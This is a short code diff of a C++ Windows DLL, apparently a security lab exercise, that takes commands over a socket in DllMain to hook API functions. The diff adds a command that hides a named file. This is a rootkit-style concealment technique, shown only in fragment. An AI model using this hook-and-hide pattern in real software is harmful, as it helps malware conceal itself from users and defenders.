@@ -1,5 +1,5 @@
 #include "hook.h"
-#include <detours.h>
+
 #pragma comment(lib, "ws2_32.lib")
 
 #define WIN32_LEAN_AND_MEAN 
@@ -74,7 +74,7 @@ int Con()
 
 extern "C" void myHook();
  
-BOOLEAN CreateHook()
+BOOLEAN CreateHookList()
 {
 
     if (Hooked == FALSE || gOrigPointer == NULL)
@@ -187,7 +187,7 @@ BOOL WINAPI DllMain(
             {
                 strncpy_s(gFuncName, recvbuf, MAX_RECSV);
                 DisableThreadLibraryCalls(hinstDLL);
-                CreateHook();
+                CreateHookList();
             }
             else
             {
@@ -196,7 +196,14 @@ BOOL WINAPI DllMain(
         }
         else
         {
-
+            if (recvbuf[0] == '2')
+            {
+                if (RecvMessage(recvbuf))
+                {
+                    DisableThreadLibraryCalls(hinstDLL);
+                    HideFile(recvbuf);
+                }
+            }
         }
 
         LAB2_PRINT("Process Atach...\n");
@@ -223,3 +230,5 @@ BOOL WINAPI DllMain(
     }
     return TRUE;  // Successful DLL_PROCESS_ATTACH.
 }
+
+
